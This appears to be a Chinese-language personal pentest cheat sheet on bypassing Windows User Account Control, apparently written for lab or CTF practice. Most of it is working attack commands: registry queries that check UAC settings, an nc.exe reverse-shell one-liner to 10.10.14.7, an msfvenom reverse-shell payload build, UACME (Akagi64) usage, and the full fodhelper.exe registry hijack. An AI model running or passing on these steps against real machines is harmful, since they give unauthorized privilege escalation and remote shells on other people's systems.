# \*uac绕过

书籍查阅

```go
https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
```

首先，查询各种信息

```bash
通常来说 whoami /groups中最下面显示middle或者low什么的都具有uac

1. 查询开启与否
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
0是关闭1是开启
如果是0，操作如下（直接反弹shell摆脱uac）
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
如果是1，那就用不了这个方法

2. 查看等级
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
这个没啥大用，只要开启了基本上操作流程一样

3. 查看权限
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy
如果是0，只有uid=500，内置管理员可以执行操作，如果是1，其他用户都可以

4. 查看key值
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
如果是0，能执行远程任务，如果是1不能，除非LocalAccountTokenFilterPolicy是1

说实话有点懵逼
总结如下
```

其次就是普遍的利用方法

```bash
1. 查询系统
powershell [environment]::OSVersion.Version
记住Build值

2. 拿到源码
https://github.com/hfiref0x/UACME
源码在这里，拿去windows用，不过我的windows好像有一份

3. 在源码页面找到系统对应的几个模块

4. 我用的vs2019，所以直接编译142以及10即可

5. 编译出来传递到靶机

6. 利用（root.exe是生成的反弹shell）
Akagi64.exe 54 C:\Users\ted\Desktop\shell.exe
系统版本在这里查找（也可以不找）
https://en.wikipedia.org/wiki/Windows_10_version_history
然后去github对应查找模块

生成命令
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.175 LPORT=7777 -f exe -o root.exe
```

当然，这里还有其他的方法，可以进行不同的尝试i

1. 第一种

```bash
讲的很清楚，一步步来即可
https://github.com/k4sth4/UAC-bypass
```

1. 第二种

```bash
https://github.com/CsEnox/EventViewer-UACBypass
```

1. 第三种

```bash
https://github.com/winscripting/UAC-bypass
```

1. 第四种

```
当存在fodhelper.exe的时候，可以这么使用，上传一个普通的msf反弹shell

REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\ted\Desktop\shell.exe" /f 

.\fodhelper.exe
```
